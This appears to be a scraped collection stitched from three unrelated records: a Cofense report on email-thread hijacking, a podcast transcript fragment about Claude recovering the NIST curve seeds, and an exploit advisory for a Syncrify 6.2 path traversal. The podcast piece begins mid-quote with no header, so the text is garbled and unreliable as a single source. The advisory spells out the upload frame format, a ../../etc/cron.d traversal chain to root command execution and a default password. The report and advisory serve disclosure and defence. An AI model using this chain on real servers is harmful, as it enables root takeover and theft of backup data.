articles.title: Threats Hidden in Replies: Threat Actors Deliver Malware and Credential Phishing in Email Threads
articles.context: By: Intelligence Team, Kahng An Recently, threat actors have been increasingly delivering malware or credential phishing attacks at the end of long email threads designed to...
articles.full_text:
By: Intelligence Team, Kahng An

Recently, threat actors have been increasingly delivering malware or credential phishing attacks at the end of long email threads designed to exploit a potential victim’s trust in an email contact. In this tactic, threat actors deliver malicious payloads at the end of seemingly normal email conversations after gaining the potential victim’s trust. These kinds of attacks, also known as email thread hijacking, exploit the recipient’s trust in the sender after several legitimate emails. Often these are legitimate email threads that threat actors respond to when accessing compromised email accounts. However, they can also be email threads intentionally started by the threat actor. In these latter cases, the emails start off as seemingly harmless messages that are used to build trust with a potential victim before delivering a malicious threat. While Cofense Intelligence has been tracking these campaigns as response-themed emails, the actual malicious email at the end of the thread is usually similar to simpler meeting invitation, document, or shared file-themed emails. As such, properly trained and aware recipients should be able to spot these threats that are embedded at the end of a conversation. This report is a high-level overview of some recent response-themed emails and some common campaign patterns to be aware of.

Key Points

Threat actors have been found delivering malware or credential phishing attacks as replies to email threads. These email replies can be found in both existing legitimate email threads and ones started by the threat actor.

Cofense Intelligence tracks these campaigns as response-themed Active Threat Reports (ATR), which outline the campaign’s spoofed brands, subject lines, and resulting malicious payloads.

Response-themed ATRs focus on IOCs (indicators of compromise) from the final malicious reply in an email thread.

Response-themed emails can be difficult to filter against because they are found within email threads that contain mostly non-malicious messages. Traditional email security solutions may trust long threads of seemingly legitimate emails and fail to block the final malicious payload.

Malware delivery was the predominant threat in Q1 2026 with 83.3% of response-themed ATRs being malware ATRs, but credential phishing was more prevalent in Q2 and Q3 2026 with 62.5% and 92.1% of total response-themed ATR volume in those quarters.

While response-themed emails have been increasing in popularity this year, response-themed emails are not a completely new tactic. They were previously seen in similar volume in Q1 2024 though were rarely seen by Cofense Intelligence throughout all the latter half of 2024 and almost all of 2025.

What Are Response-Themed Emails?

Cofense Intelligence tracks response-themed emails as any malicious emails that appear to be, or actually are, a reply to an email thread. These kinds of threats are notable because the vast majority of malicious emails are messages that are not contained within a thread. By delivering malware or phishing sites within replies to an email thread, threat actors are able to abuse pre-established trust that was formed over a series of seemingly legitimate back-and-forth messages. The ultimate goal of response-themed email campaigns is to establish a higher level of trust with a potential victim over a series of message replies (or abuse already established trust from a pre-existing email thread) and betray that trust with a standard malicious email lure. In short, response-themed emails are not necessarily any different from the typical malicious email except for this additional abuse of trust and the amount of time the threat actor devotes to developing this trust.

While the concept may seem basic, response-themed emails tend to be rarer compared to most other email themes. This is largely because replying within email threads requires a threat actor to either opportunistically use an existing email chain within a compromised account or intentionally target potential victims with seemingly legitimate email correspondence. These factors lead response-themed campaigns to be rarer and generally more targeted. Figure 1 shows the frequency of response-themed ATRs from Q1 2024 to Q3 2026.

Figure 1: Frequency of response-themed ATRs from Q1 2024 to Q3 2026.

The recent volume of response-themed emails is not unprecedented. Q1 2024 saw a similar amount of total response-themed email campaign volume to what was seen in Q2 2026. However, the majority of campaign threats during this time were credential phishing attacks instead of malware delivery. Response-themed emails quickly plummeted in volume after Q1 2024 and were not seen in any substantial volume until Q1 2026. From there, the quarterly volume of response-themed malware ATRs has remained relatively stable until Q3 2026, while the amount of credential phishing ATRs has continuously skyrocketed in Q2 and Q3 2026.

Campaign Characteristics

Generally, response-themed emails are only distinguished by the fact that they are malicious emails within email threads. While these kinds of campaigns may be more deceptive than most due to the social engineering aspects of building trust over multiple legitimate interactions, the lures themselves still use many common techniques from other email themes. For example, Figure 2 shows a campaign that resulted in a response that sends a meeting invitation link that actually delivers GoTo RAT, a legitimate remote access tool that is a part of the LogMeIn management suite and is frequently abused by threat actors as a remote access trojan.

Figure 2: ATR 416570 contains a response to a long email thread with a sudden invitation to a meeting. However, the embedded link to the purported meeting site delivers GoTo RAT instead. This figure shows only the final reply, which contains the malicious link. The preceding thread has been omitted for length.

Similarly, message notification lures are also commonly seen within response-themed campaigns. Figure 3 shows a secure message notification-themed email that contains an embedded link to a purported message center. However, the site then requests verification to open the secure message by either accessing a Microsoft account credential phishing site or downloading ConnectWise RAT, a legitimate remote access tool also known as ConnectWise ScreenConnect that is currently one of the most frequently abused by threat actors as a remote access trojan.

Figure 3: ATR 418145 contains a response to an email thread with a secure message notification. The embedded link directs to either a Microsoft-spoofing credential phishing site or a ConnectWise RAT download. This figure shows only the final reply, which contains the malicious link. The preceding thread has been omitted for length.

Conclusions

The cause for concern with these campaigns is not necessarily the malware or credential phishing payloads but the way the threat actors build up trust through legitimate emails. Response-themed emails, by their very nature of being within seemingly harmless email threads, seek to gain a potential victim’s trust through social engineering techniques. Compromised email accounts can be used to send links to supposed “important documents” that actually lead to a credential phishing attack. Threat actors can email a potential victim with harmless messages over the span of several hours or even days before attempting to send a “meeting invite” that downloads malware. In both of these cases, the threat actors are relying on betraying trust that was built up via an existing credible name or a series of seemingly normal interactions.

Thankfully, writing email replies still takes more effort from the threat actor than simply spamming out hundreds or thousands of similarly structured email templates across a list of victims. If written to a legitimate email chain, these would require access to a compromised email account that happens to have an email thread. The threat actor would then need to write a response with a hook that would be relevant to the thread (such as a meeting invitation). If the threat actor wants to start the email thread, then they would need to wait for a potential victim to respond and write replies to them. While email responses can be automated through generative AI solutions, allowing this campaign pattern to be scaled up to a broader potential attack surface, response-themed campaigns are generally limited to being highly targeted in nature, whether through opportunistically replying to existing threads in compromised email inboxes or creating new threads from scratch. These factors make response-themed emails rare compared to other campaign types.

For leadership, the core message is straightforward: a trusted sender and a familiar email thread are not necessarily proof that a message is safe. These kinds of attack patterns highlight the importance of carefully reading and assessing emails for potential threats, even within established email threads with known contacts. Any message within a thread may contain a malicious threat, so recipients should always stay aware of potentially manipulative messages that may be delivering unknown links, strange attachments, or other potential threats. A message that asks you to click a link, open an attachment, or log in deserves a second look no matter whose name is on it.

Mitigations

While traditional email security detections based off trusted senders, established contacts, and other known good signals may fail to filter these kinds of campaigns, email security solutions that continuously scan for suspect behavior and analyze malicious links and attachments in a sandbox environment may be the most reliable way of filtering these attacks. In particular, behavioral detections that flag sudden geographic shifts from the sender and potentially malicious requests may be better at handling this attack pattern.

Ultimately, the best defense against these kinds of attacks is training and awareness of potential email threats. While these campaigns feature their malicious payloads within email thread replies, they often include common phishing lures such as meeting invitations or documents that need to be reviewed. The only major difference is that response-themed emails can be more targeted and tailored to a potential victim based on responses within the thread and the amount of time involved in establishing and then exploiting trust. However, once the malicious email is sent, it will invariably be similar to what most malicious emails look like. With proper training and awareness of common email phishing techniques, recipients should be able to recognize potentially suspect emails. However, the real challenge is applying constant vigilance with familiar contacts or otherwise harmless emails. When receiving potentially malicious emails, consider validating the contents of the email out-of-band with the sender, especially if they are a known and trusted contact. While doing so, be sure to rely on contact information gathered from outside of the email itself because threat actors can also easily modify signature blocks as a part of their attack.

When developing better preventative measures against these attacks, consider implementing the following as a part of training and standard security operations:

Update employee security awareness training to reflect how these campaigns actually arrive: as replies inside existing email threads, often from a known contact whose account has been compromised, ending in a meeting invitation, a shared document or file link, or a secure message notification. Employees trained on real, current threats are more likely to pause before clicking, even when the message comes from a familiar name. Simulation exercises should reproduce this exact pattern, a malicious reply within an ongoing thread, rather than outdated generic examples.

Establish and enforce a software allowlist for remote access tools. Response-themed campaigns frequently deliver legitimate remote access tools that have been repurposed as malware, including ConnectWise RAT. Any remote access tool not on the approved list should be blocked from installing on corporate devices. Organizations without an allowlist should at minimum block the digital certificates associated with remote access tools they do not use.

Deploy enterprise password managers. When an employee follows a malicious reply to a credential phishing page, the password manager will refuse to fill credentials because the domain does not match the legitimate service. This gives a structural catch that works no matter how convincing the branding or how trusted the thread appears, and it complements employee training rather than replacing it.

Deploy email security that looks for behavioral anomalies inside otherwise trusted threads, rather than relying on sender reputation alone. Because these emails often come from legitimate or compromised accounts, the sending domain is frequently valid, so brand and domain mismatch checks catch little. Signals that do help include a known sender suddenly sending from an unusual location, or a long-running thread that abruptly introduces a link or attachment.

Use tools and software provided by Cofense such as Triage and Vision to prevent initial access and stop follow-on attacks. Triage gives security teams an in-depth breakdown of a reported phishing email, which makes a malicious reply buried in a legitimate thread easier to analyze and act on. Vision uses human insight and AI precision to quarantine and remove malicious emails from inboxes, including messages that reached users from a trusted or compromised sender.

Give employees a simple, one-click way to report suspicious emails, which is exactly what Cofense Triage and Vision are built for. Because these campaigns often target multiple recipients from the same infrastructure, an employee who reports a suspicious reply quickly gives security teams the chance to block that infrastructure before others click. A well-trained employee who flags a response-themed email is a detection tool no automated system can replicate.

"Neal Koblitz and Alfred Menezes wrote an excellent summary on this controversy, titled 'A Riddle Wrapped in an Enigma,' which discusses the history and concerns around the seed values.  This mystery led to an amateur investigation into the origin of the seeds and a bounty for anyone who could find them.  The best story was that Jerry Solinas, longtime NSA employee, generated the seeds using a hash of a humorous passphrase."  In 2015 Jerry wrote:  "I believe there was a counter rather than multiple hashing, but I don't know details.  The message was along the lines of 'Give Bob and Jerry a raise' or 'Bob and Jerry rule' or something like that.  It was Bob Reiter who actually wrote the code, and he doesn't remember the details either.  Nor were we able to find archives from so long ago. If they exist, they're no doubt sitting on a hard drive near the Ark of the Covenant."

So a mystery, but a worthwhile mystery.  So Anthropic continues:  "Unfortunately, Jerry died in 2023, and other colleagues at the time were not responsive, leaving open the question of how these seeds were originally derived.  Several Anthropic employees had unsuccessfully chased the seeds following the tip about it being a hash of some humorous phrase.  That turned out to be wrong.  In October 2026" - meaning this month, like last week - "a curious Anthropic employee asked an internal research model..."

MIKAH:  Definitely.  It would have to be an internal one, sorry.

STEVE:  Yup, "...if it could figure out how those seeds were generated without pointing at that clue."  Which turned out to be wrong, probably.

They wrote:  "Searches for the phrase, built from the rumors, had come up empty.  Claude tried a different angle:  anticipating how the software that generated the curves must have worked.  Claude guessed the software used a pseudorandom number generator" - a PRNG that we've talked about ad nauseam on the podcast in years past - "that shipped with 1990s C libraries.  These old PRNGs are weak enough that their output can be recognized.  Recognizing that output would reveal which PRNG was used and possibly allow recovery of its initialization state."

Because, just to digress for a second, you start a PRNG with a certain state, and it is a very simple algorithm.  Typically you add a number, and you multiply a different number, and you throw away the overflow, keeping just the lower bits.  And that follows a very recognizable pattern based on what those two numbers are.  But it also starts at something, and that's the original seed, its initialization state.

So then they said Claude, having been asked where did these weird-looking numbers come from, having no idea whatsoever, says, well, probably, how about maybe, it was a PRNG back from then, like the 1990s, and people were using C.  So let's, you know, there were PRNGs, pseudorandom number generators, in those C libraries back then.  So they wrote:  "Claude wrote a scanner that slid along each published seed one bit at a time and tested whether adjacent chunks were consecutive outputs of any of the 1990s-vintage generators.  The scan covered 34 combinations of generator and output slices.  At that point, Claude noticed a pattern in the top bits for some seeds.  They were all zero.  Written as five 32-bit words, four of the 10 seeds have a 0 in the top bit for all 20 words.  That would happen by chance with a probability of 1 out of" - actually it's even more bugs than Microsoft fixed this month.

MIKAH:  Yeah.

STEVE:  "One out of 5,810.  That was a signature of the linear congruential generator lrand48, which only returns the top 31 bits of a 48-bit state.  The pattern is visible by eye once you know to look for it.  To recover the state, Claude took the first word, tried all 2^17 values of the 17 hidden bits, okay, so that's 131,000, or 128K in binary, and tried them all, possible values of the unknown bits because you only get the lower 31, so that meant there was an upper 17.  Tried them all and checked that the next four words followed."  In other words, you can move from a given state on the PRNG because you're adding and multiplying, you're able to always step it forward.  And technically you can go backwards, too.  So they said:  "That worked for all four seeds under discussion."

They said:  "The prime-curve seeds came from the same lrand48 generator, but kept fewer bits of each output.  Claude had to recover the internal state of the PRNG from those bits.  It turns out recovering the state of a truncated linear congruential generator is a textbook lattice problem, solved" -  yeah, of course, anybody knows that.

MIKAH:  Textbook, yeah.

STEVE:  That's right, it's textbook, "solved by the Lenstra-Lenstra-Lovasz (LLL) basis reduction algorithm."

MIKAH:  Oh, right, that, yeah.

STEVE:  Yeah, huh.  "Claude didn't know" - but of course it knows about that because it unfortunately knows everything.  Unfortunate for those trying to protect their domains from AI.  "Claude didn't know which bits of the state the seeds might show, so it ran the solver over every window.  Five NIST prime-curve seeds plus five more from the ANSI X9.62 standard all had the same pattern:  lrand48() >> 23 bits.  Each recovered 48-bit state regenerates all 160 bits of its seed, which does not happen by chance.

"This linear congruential generator runs backwards as easily as forwards, so for each seed Claude stepped the state backwards until it reached the form that it would have been initialized by srand48, with the low 16 bits equal to 0x330E.  The internal PRNG state of that form would come up once every 65,536 steps, so reaching one is not evidence on its own."  That is to say, it could have been some multiple of that number of steps.

Anyway, they wrote:  "However, for the 10 prime-curve seeds, every srand48 initialization was" - get this - "a Unix timestamp representing a date between May in 1997 and April in 1998.  The NSA used the weak PRNG seeded by Unix's time.  The four binary-curve initializations read as February in 1984.  With the timestamps doubled, they map to April 17 in 1998, two weeks after that P-224 run.  So the program may have halved the clock."

Get this, then.  "Claude's internal thinking."  It's the AI Claude's internal thinking at the time of its discovery was as follows, its chain-of-thought.  It says:  "This is astonishing.  It solves the 25-year-old mystery.  Hmm, wait.  Let me be skeptical:  Am I in some sort of simulated/test environment?  The seeds match my memory of actual values.  Hmm, is it plausible in reality?  As of my knowledge, the bounty was unsolved.  All top bits clear - 20 bits, so the chance is one in e-6.  So indeed real-world.  Wow, it's a real discovery.

"Hmm, wait.  Let me be careful about that plausibility.  Is it suspicious that such an obvious thing wasn't discovered in 25 years?  It's verified by direct computation on my side:  160-bit match from a 32-bit seed plus a small index:  no chance coincidences (10 findings times 160 bits).  It's real."

And then Anthropic continues, writing:  "But wait, there's more.  Each curve also comes with a base point, G, the fixed point that every ECDSA public key is a multiple of.  The seed found above does not determine this G, and so another question arises:  how were these base points generated?"

They said:  "While checking the seeds, Claude also found where some of the base points came from.  The base points of the six curves generated in May '97 come from the random number generator FreeLIP, Arjen Lenstra's long-integer arithmetic package.  Early versions of Victor Shoup's NTL library shipped the same code.  The recipe here is simple:  Seed the generator with a small integer.  Throw away seven outputs."  That's to let it get started.  Linear congruential random number generators need to warm up a little bit sometimes.  "Throw away seven outputs.  Generate candidate x-coordinates from 26-bit outputs reduced by mod p.  Repeat step 3 until x is on the curve."

They said:  "Claude found the generator seeds are 20,000 for the P-192 curve, 20,420, 20,507, and 20,509 respectively for the prime239v1, v2, and v3 curves respectively, and 20512 and 20517 for the prime192v2 and v3 curves."

So, finally, just to be clear, they summarize the event.  So Anthropic's summary.  They said:  "In under half an hour, Claude discovered the origins of the NIST P-192, P-224, P-256, P-384, and P-521 seeds.  None of them were the results of any hash algorithm at all, but rather the output of the C library's lrand48 random-number generator, seeded with a Unix timestamp.

"The algorithm used would sample bytes from the random number generator initialized by a Unix timestamp (t) for some number of iterations (n).  Each iteration would draw 20 bytes as a candidate seed.  So the first 20 bytes are candidate 1, the next 20 bytes are candidate 2, and so on.  For example, P-256 required 1,842 iterations to output the standardized seed," the one that everybody is using, and that the NSA gave to NIST and said, "Here's a good seed."

They said:  "This is not a cryptographic break, a new attack, or a weakness in the ECDSA curves.  In fact, this makes us more confident the curves were chosen without any backdoors or intentional weaknesses.  For many years, people have been a little bit suspicious of the origins of the NIST curve parameters.  They were presented to NIST without any mention of how they were chosen, leaving people wondering if they may have been chosen to have deliberate backdoors in them.

"These findings make that much less plausible.  The seeds were generated in a very simple way:  a common pseudorandom number generator initialized from the clock, which anyone can now reproduce.  That leaves much less room for subversion and that we can be confident the parameters are secure."

Okay.  So my take.  As I noted at the start of this, it is very cool that we now know the origin of the curve parameters for the crucially important Elliptic Curve Digital Signature Algorithm curves.  That's great.  But I'm astonished by the work Claude did to obtain these results.  It was a puzzle that had stumped the world for the past 26 years since the standard was adopted, and it represented knowledge that even the NSA had truly lost through the mists of time.  Yet an autonomous AI agent reverse-engineered the source given only the scantiest of data to work from, which turned out to be the sparsely selected partial outputs of an old 1990s-era algorithmic pseudorandom number generator.  We are screwed.  We are so - we are in such trouble.

You know, coupling that demonstrated capability with the earlier report from Palo Alto Networks about their analysis of the actions taken by that attacking agentic AI, which they observed, I really do worry that we're not going to be ready for what's coming. I've largely, as I've said, I've largely been focusing upon the elimination of software bugs.  That's great.  It should be clear that that's just the barest tip of the iceberg because true internal enterprise security is about much more than just bugs.  Employees fall for phishing and ClickFix attacks all the time.  They open email and click links they should not.  They share confidential information through internal email that then persists in archives.

And we know how fundamentally fallible people are.  We don't mean to be, but that's our nature.  We screw up.  Someone will forget to remove an ex-employee's credentials after they're terminated.  An adversarial AI might see that, track down the employee, and offer them payment in Bitcoin in return for those credentials.  We now know that's not at all far-fetched for an agentic AI.  We have been witnessing what once sounded like science fiction coming true daily.

It's true that, to some degree, being forewarned is forearmed.  So I guess at least we have that.  I hope those who may be in a position to understand and act upon these truly huge systemic risks will be able to do so in time.

MIKAH:  And I hope so, too, honestly.  But...

STEVE:  I'm not hopeful.

MIKAH:  Yeah.

STEVE:  I mean, it is - what we've seen from agentic AI I hope is terrorizing CISOs.  I hope that they're not just thinking, oh, well, we'll patch all of our Cisco gear, and Microsoft stuff's going to stop having vulnerabilities soon, any day now, which actually seems likely.  It won't matter because everything else that's going on that is really not utterly secure inside an organization isn't about bugs.  It's about behavior.  It's about people and the things we do.

MIKAH:  It's not bugs, it's behavior.  And try as folks might, it seems that there's not a foolproof way to stop people from being people.

STEVE:  No.

MIKAH:  Do you have - if we don't have hope, what do we have?  Do we have best practices?

STEVE:  The only thing - one of the applications that I've seen for local agentic AI, and I've talked about it on the podcast, would be an AI, your AI, so people are not worried about privacy, watching everything you do on your computer, looking at the screen with you, watching you type and use the mouse.  That's the only solution for human stupidity.  So it would be looking at your email with you.  And if you click a link, it would say whoops, wait a second.  I mean, and it would go follow the links, see what's there, check it out, see if it looks safe.  Or if a box pops up and says, oh, in order to further verify yourself, please copy this string into your RUN dialog and hit ENTER.  That's the ClickFix attack, which is the most successful attack we have now.  It would say - it would stop you and say, whoa, wait.  So it would be your little angel sitting on your shoulder, looking at what you're doing.

I think, first of all, every employee in an enterprise needs to have that, their own local behavior monitor, as does the company.  I mean, I don't mean to pump a sponsor of TWiT because I've also mentioned CrowdStrike.  They're a competitor of Palo Alto Networks.  Both companies have jumped on this "agentic AI for defense" bandwagon so that you have a device on your network, hopefully watching your enterprise's back, looking for this kind of behavior, detecting anything anomalous, like all of those bullet points that Palo Alto Networks listed.  It's like, these are all the things you have to do.  Well, yeah, if anyone had time and remembered and didn't do it just once, but kept doing it every day.  So, I mean, we really do need a huge defensive posture about what's coming, and we don't have it today.

MIKAH:  And it doesn't feel like anyone then is getting serious at the level that you are suggesting they get serious.

STEVE:  It's going to, well, we know what happened with ransomware; right?  There were highly publicized, horrific ransomware attacks that made lots of news.  And enterprises, after enough of those, finally said, ooh, maybe we should be backing up our servers.  And so it took a year or two.

MIKAH:  Yeah.

STEVE:  But then, you know, then they were able to recover from the encrypting their data attack because they had their own copy offline of non-encrypted data that was still fresh.  Of course, the bad guys then stopped bothering to encrypt the data.  They just sucked it out and then threatened its public exposure in order to ransom.  So, but the point is, after enough horror, there was an effective response.

MIKAH:  It's always object.

STEVE:  That's what's going to have to happen again.  There is going to have to be some high-profile, you know, agentic AI.  It's not the fault of AI.  It's the bad guys using the relentless power of AI for evil purposes.  There'll be some of those.  And then, you know, and more companies will jump on the bandwagon to get into the endpoint defense business.  We'll get agents running on every enterprise laptop and workstation in order to prevent them from misbehaving.  Something will be looking at email archives, cleaning out old passwords that have been given and hard-coded tokens in software that has not been rotated in years.  You know, but, I mean, it's going to be bad.

MIKAH:  And that's how we - yeah, that's how we operate.

STEVE:  I don't see any way that it's not going to be bad.

MIKAH:  It's got to be bad before it can get better because humans [crosstalk].

STEVE:  You know, world's not going to end.  None of that's going to happen.  I mean, I'm not saying it's not possible.  But then a big meteor could come and end all of our concerns.  So...

MIKAH:  Please.

STEVE:  But what is going to happen is we're going to see a spate of serious attacks, you know, in the companies that have not done everything that they can.  And I'm not sure.  I don't know whether any of these, you know, commercial AI-based providers are anything other than opportunistic.  They might just have some token AI that, you know, that itself ends up being commandeered when the bad AI comes in, you know, teams up with it.  Okay, let's go do this.  I don't know.  It's - yeah.  These reports of attacks demonstrate too much capability, capability that we are not yet ready to defend.

MIKAH:  All right.  That is why we hope that the CISOs are all watching this show, to get as freaked out and informed as you are making it possible to be.

articles.title: [remote] Synametrics Syncrify 6.2 - command execution
articles.context: com/Exploit-Garbage/0day-Rubbish The shipped proof of concept is Python 3 using only the standard library, with no third-party dependency and no hardcoded target
articles.full_text: Title: Synametrics Syncrify 6.2 - command execution Author: 0day Rubbish Research Team Contact: disclosure@0day-rubbish.com Type: remote Platform: Linux CVE: pending Description: Synametrics Syncrify 6.2 build 1178, the closed-source incremental backup and file-replication server from Synametrics Technologies, Inc. (United States), written in Java and served by an embedded Tomcat 9.0.113 through the vendor's in-house sradef framework whose single front controller routes every request as /app?operation=<op>&st=<step> to a handler registered in WorkerMappings.xml, contains a path traversal (CWE-22 primary, CWE-269 and CWE-78 contributing for the deployment shape that converts the write into an execution) in the chunked-upload branch of its PublicLink handler. That branch, operation=pb with st=u, reads a length-prefixed binary frame straight from request.getInputStream() rather than through any parameter parser: four big-endian int32 fields for protocol, chunkNumber, totalChunks and size, then a four-byte length prefix followed by UTF-8 filename bytes, then exactly size body bytes. At PublicLink.java:70-110 the decompiled method evaluates new File(base, filename) on that client-supplied filename with no rejection of "..", no rejection of path separators, no base-name extraction and no canonical containment check, creates missing parent directories with target.getParentFile().mkdirs(), opens the result with new FileOutputStream(target, true) in append mode, writes the size bytes it read and returns 0, which the caller at PublicLink.java:127 turns into the client reply code="1" with <payload>0</payload>. base is the authenticated user's own folder at /opt/Syncrify/PublicLinks/<user>/<generated-folder>, five components below the filesystem root, so a chunk name of ../../../../../etc/cron.d/<name> leaves it and lands a cron fragment anywhere the service identity can write. Because the documented Linux deployment shape runs the server process at uid 0 and a cron daemon was active on the verified instance, the host scheduler then reads that fragment as a root-authored job definition and runs its command field through a shell on the next minute boundary. The application never constructs, quotes or invokes a command line and every execution site in the product uses an argument vector with no shell, so the execution happens one component later and argument hygiene at the application layer would not have prevented it. The chain was verified end to end and the identity capture the cron job produced was uid=0(root) gid=0(root) groups=0(root), established twice over: the fragment landed as -rw-r--r-- 1 root root at mode 0644, a file's owner after creation being the effective uid of its creator, and the scheduled job's own output reported uid 0 because the fragment names root in its user field and a scheduler will not honour that for a job file it does not already trust. The principal required is the product's lowest-trust account type. The gate on operation=pb is a secLevel=0 registration, meaning no administrator session, and the handler's own authentication call validates a credential from the backup-user store at config/UserMappings.xml via syncrify.users.DefaultUserManager rather than from the web-administrator store at config/umap.dat; the two stores are independent and must not be conflated. A backup user's entire legitimate job is to move bytes into its own repository, so the privilege boundary that fails here is inside the product, not a misconfiguration of the host. The defect is an omission rather than an absent control: three sibling families in the same tree, written against the same client protocol, do filter the same kind of field, the profile-upload, profile-fetch and file-splitter handlers rejecting separators with indexOf(47) and indexOf(92), the multipart upload path collapsing the name through getName(), and the download path testing indexOf("..") and answering 404 on a match. The chunk-upload branch calls none of them. There is no decoding step between the socket and the constructor, so no encoding trick is involved or needed. The product does ship a factory administration password of letmein in its first-run install wizard, but the first administrator login is forced through a password change through ChangePassword.jsp, the credential belongs to a different user store than the one gating this sink, and it is documented as a contributing fact only: it appears in no vector, raises no metric, and no conditional reading assumes it has not been rotated. No unauthenticated path to this sink was found and none is claimed. CVSS: 7.5 High (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H) is the single score published for this finding. That is the primary reading, and the two metrics that carry its nuance are AV:N and AC:H: the vulnerable component is an HTTP handler on a network-bound servlet connector and the credential it accepts exists so that remote backup clients can use it, so AV:N is the faithful classification of the component, while the deployment-dependent exposure of the listener carrying the route is priced in attack complexity rather than smuggled into the attack vector. AC:H is High for two reasons outside the attacker's control, that the listener carrying /app?operation= be reachable from the attacker's position and that the host run a scheduler which scans /etc/cron.d. Base = Roundup(5.873119 + 1.620146) = Roundup(7.493265) = 7.5, from ISS = 0.914816 and Impact at S:U = 5.873119. Conditional reading: 8.8 High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H), applying only where the listener carrying the /app?operation= surface is reachable from the attacker's network position, which is the normal operating mode for a backup server whose clients push data to it remotely, and computed as Roundup(5.873119 + 2.835255) = Roundup(8.708374) = 8.8. The conditional is labelled conditional everywhere it appears, is never the headline, and the published score is 7.5 rather than 8.8. Two further readings are published as rejected with their arithmetic. The changed-scope variant of the same metrics, 8.6 High (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H), is rejected because the identity reached is the same root identity the server process already holds on the same host, so no component authority boundary is crossed by the outcome; the privilege gain is carried by PR:L and by C:H/I:H/A:H, which are the metrics meant to express it. The local-vector reading, 7.8 High (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H), is rejected for an evidential reason and it is worth being explicit that this rejection lowers our own number rather than raising it: that reading is what follows if you treat the loopback binding observed in the testbed as the shipped default, and 7.8 is higher than the 7.5 this submission publishes at AV:N. The loopback binding was applied by us in the configuration before any testing began, so the host carried no public exposure while research was in progress, and there is no shipped artifact, no configuration template, no installer script excerpt and no documentation quotation, establishing the factory value of that binding in either direction, not that it binds publicly by default and not that it binds loopback by default. That unestablished reachable-listener premise is the reason AC is High and the reason the 8.8 figure is conditional, and a reader who disagrees with us about the factory default ends up with a larger score than ours, not a smaller one. No version-range claim is made: only 6.2 build 1178 was decompiled and exercised. Impact: arbitrary file write with an attacker-chosen path and attacker-chosen bytes, escalating to command execution as uid 0 on the verified deployment shape. The chunk branch writes exactly the bytes it reads to whatever path the chunk name resolves to, in append mode, creating missing parent directories via mkdirs(), so /etc/cron.d is the demonstrated escalation path and not the limit of the primitive. On this product the weight comes from what the host is for: it is a backup and file-replication server, and root on it means read access to the entire repository tree, every backup belonging to every configured client, which on a multi-tenant server is a confidentiality breach across all tenants rather than within one account, plus the server's own configuration holding administrator and backup-user credential material and transport secrets, the backup-user store comparing passwords in plaintext or storing them under a reversible permutation transform so a read of it hands over credentials directly. It also means integrity control over the replication path itself: repository contents, version and retention metadata and the server's own binaries can be altered in place, and because that path is how clients back up and restore, a modified backup set becomes a distribution channel whose corruption stays invisible until the moment the data is needed. Persistence is structural rather than incidental, a cron fragment running on every minute boundary until it is deleted and surviving restarts of both the service and the host. Availability follows the same authority: the backup service can be stopped, the host rebooted or hung, repositories deleted or truncated, and the scheduler used to keep doing so after the application alone is remediated, which destroys the recoverability that is the entire reason the product exists. All of that beyond the executed identity capture is argued from the identity reached and the deployment layout and was not performed; no repository data was read and no product file was modified or deleted during verification. Verification boundary: static reversal of the decompiled handler tree, then a live run against a single deployed instance of Syncrify 6.2 build 1178 installed from the distributed Linux tarball archive into /opt/Syncrify and started with ./run.sh, behind the embedded Tomcat 9.0.113 announcing itself as Synametrics Web Server v7. Two properties of that instance were the researchers' rather than the product's and both are carried as boundaries. The portal listener was bound to the loopback address by an explicit configuration edit made before testing, so remote reachability of the route is argued from the product's own design and binding configuration, from the front controller being the same listener that serves the client-protocol operations backup clients use, and from the structural fact that a backup server whose clients push across a network must have that listener reachable from them or it cannot perform its function; it is not a measurement from a separate host, and no shipped artifact establishes the factory binding in either direction. The backup-user store did not exist after installation, so the verification account was written into config/UserMappings.xml by hand with plaintext password comparison rather than provisioned through the administrator's user-management operation, which is licence-gated and was blocked by a zero licence count; the encrypted-entry and directory-authentication branches were examined statically and not exercised. The chain was driven from the target host itself over the loopback interface because that is how the listener was bound, so the same chain arriving from across a network segment was not verified and is not claimed. Four controls were exercised: a non-traversing chunk name through identical authentication, framing and routing in the same session, landing inside the user's own PublicLinks folder with an assertion that neither the fragment nor the marker existed, which isolates the traversal as the cause of the outcome and of nothing else; a Java-level confirmation that the multipart family's getName() collapse keeps a traversing name inside the PublicLinks root; a dispatch control against st=f, which reached a different void E() overload that parses an ed parameter as a Long and performed no write anywhere, fixing the sink to the st=u branch rather than to the handler in general after an initial static reading had attributed the upload to the wrong overload; and the four-way authentication reply table showing code="1" for a correct pair, code="-2" for a wrong password so the comparison is live, and code="-1" for an absent password and an absent user so the parameter-presence gate fired before the credential lookup was entered, which is what makes the lookup's no-comparison branch unreachable from this surface. Root execution was observed rather than inferred, and a non-root service deployment was not tested, so no claim is made about what the primitive achieves under an unprivileged service identity, where the escalation demonstrated here would not follow while the file write itself survived. Exactly one payload shape was executed, an identity capture into a marker file, and only that shape is claimed; the advisory reproduces the identity string and the frame field lengths derived from the field values but not the run's own byte capture, which was not preserved, not the generated PublicLinks folder name, which embeds the run's timestamp, not the credential pair, which are mandatory tool arguments with no default, and not the per-run fragment name or marker path. The unauthenticated surface was exhausted first with negative results: thirteen operations answer anonymous requests with real content and no credential check and all thirteen are sink-free; the remaining level-0 operations are not anonymous and answer code="-2" without valid credentials; seventeen Runtime.exec and ProcessBuilder sites exist and none is reachable anonymously; eight deserialization candidates have no network caller and the classpath carries no gadget library, no commons-collections, Jackson, XStream, Kryo or Hessian; and no template engine or naming-service lookup exists in the tree. That enumeration is not a proof the unauthenticated surface is safe, and it surfaced weaknesses deliberately not claimed here and not folded into any metric, being a manualOverride filter-block bypass exposing debug pages with a directory listing and an environment-variable dump, a password-recovery account-enumeration weakness, globally disabled CSRF prevention that is irrelevant to a chain needing credentials the attacker holds, vendor-default credentials for an embedded database that is configured but disabled and was not listening, and a default trial licence serial whose effect was left unresolved. Only Syncrify 6.2 build 1178 is claimed; the same sradef framework underpins the vendor's sibling products and this build's own web.xml still carries the display-name SynaMan, which is recorded to say where else the same construction is worth auditing, and no sibling product was tested. Proof-of-concept and full analysis, published unconditionally: https://0day-rubbish.com/blog/synametrics-syncrify-publiclink-chunk-upload-traversal-cron-root-rce PoC location in the public repository: 